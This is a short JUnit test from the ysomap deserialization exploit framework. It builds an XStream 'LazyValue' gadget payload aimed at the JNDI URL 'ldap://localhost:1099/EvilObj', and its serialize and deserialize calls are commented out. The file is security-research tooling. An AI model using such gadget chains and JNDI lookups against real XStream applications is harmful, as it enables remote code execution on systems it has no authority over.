package ysomap.core.payload.xstream;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.serializer.Serializer;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
public class LazyValueTest {

    @Test
    public void getObject() throws Exception {
        Payload lazyValue = new LazyValue();
        Bullet bullet = lazyValue.getDefaultBullet("ldap://localhost:1099/EvilObj");
        lazyValue.setBullet(bullet);
        Serializer serializer = lazyValue.getSerializer();
//        Object payload = serializer.serialize(lazyValue.getObject());
//        System.out.println(payload);
//        serializer.deserialize(serializer.serialize(lazyValue.getObject()));

//        serializer.deserialize(payload);
    }
}